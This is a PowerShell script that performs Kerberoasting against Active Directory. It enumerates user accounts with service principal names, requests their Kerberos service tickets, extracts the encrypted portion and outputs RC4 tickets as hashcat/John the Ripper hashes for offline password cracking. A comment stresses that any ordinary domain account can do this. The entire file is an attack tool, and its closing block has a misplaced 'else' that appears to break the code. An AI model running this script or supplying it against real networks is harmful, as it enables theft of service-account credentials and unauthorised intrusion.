Add-Type -Assemblyname System.IdentityModel
$ErrorActionPreference = 'silentlycontinue'

#variabler

$TargetList = @()
$TargetAccount = "TESTHEST"
$Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
$Path = 'GC://DC=' + ($Forest.RootDomain -Replace ("\.",',DC='))
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$Path)
$Searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
<#
The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. 
Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline.
You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.
#>


$ad_search = New-Object DirectoryServices.DirectorySearcher
$ad_search.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))" #Vil ikke have computernavne 
$user_objects = $ad_search.FindAll()
foreach($user in $user_objects) {
                 $user_entry = $user.GetDirectoryEntry()
                 foreach( $SPN in $user_entry.ServicePrincipalName ) {
                    $Searcher.Filter = "(servicePrincipalName=$SPN)"
                    $TargetAccount = [string]$Searcher.FindOne().Properties.userprincipalname
                    $SPN_string += $SPN
                    #Write-Host $SPN
                    if ($SPN.ToLower().Contains("http") -and $SPN.ToLower().Contains($env:USERDNSDOMAIN.ToLower())) {
                        write-host "`nContains http $($SPN)"
                        
                        $error.clear()
                        $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -Argumentlist $SPN
                        $bytestream = $ticket.GetRequest()
                        $hexstream = [System.BitConverter]::ToString($bytestream) -Replace "-"
                        $etype = [Convert]::ToInt32(($hexstream -Replace ".*A0030201")[0..1] -Join "", 16)
                        #$hexstream
                        $encryption = switch ($etype) {
                            1       {"DES-CBC-CRC (1)"}
                            3       {"DES-CBC-MD5 (3)"}
                            17      {"AES128-CTS-HMAC-SHA-1-96 (17)"}
                            18      {"AES256-CTS-HMAC-SHA-1-96 (18)"}
                            23      {"RC4-HMAC (23)"}
                            24      {"RC4-HMAC-EXP (24)"}
                            default {"Unknown ($etype)"}
                            }
                        
                        write-host "The following SPN $($SPN) has encryption type: $($encryption)"
                        try {
                            [System.Collections.ArrayList]$Parts = ($hexstream -replace '^(.*?)04820...(.*)','$2') -Split "A48201"
                            if ($Parts.Count -gt 2) {
                                $Parts.RemoveAt($Parts.Count - 1)
                                $EncPart = $Parts -join "A48201"
                            }
                            else {
                                $EncPart = $Parts[0]
                            }
                            $Target = New-Object psobject -Property @{
                                SPN            = $SPN
                                Target         = $TargetAccount
                                EncryptionType = $encryption
                                EncTicketPart  = $EncPart  
                                } | Select-Object SPN,Target,EncryptionType,EncTicketPart
                                $TargetList += $Target
                                #$TargetList
                                }
                        
                        catch {
                            Write-Host "Coulnt not extract the encoding og the SPN: $SPN"
                        }
                            
                    }
                }
            }
                #$SPN_list
#$TargetList
if (!$TargetList.EncTicketPart) {
            Write-Host "Could not retrieve any tickets!"
}
else
{
    $Output = @()
    Write-Host "Converting $($TargetList.Count) tickets to hashcat / john format"
    foreach ($Target in $TargetList) {
        if ($Target.EncryptionType -eq "RC4-HMAC (23)") {
            $Account = $Target.Target -split "@"
            $Output += "`$krb5tgs`$23`$*$($Account[0])`$$($Account[1])`$$($Target.SPN)*`$" + $Target.EncTicketPart.Substring(0,32) + "`$" + $Target.EncTicketPart.Substring(32)
            }
        }
        else {
            Write-Host "The ticket of SPN: $($Target.SPN) is encrypted with $($Target.EncryptionType) encryption. There might be a problem"
        }
    }

Write-Host "returning $($Output.Count) tickets"

Write-Host "`nHere is a list of hashes with hashcat or john the ripper format`n" -ForegroundColor Green

$Output

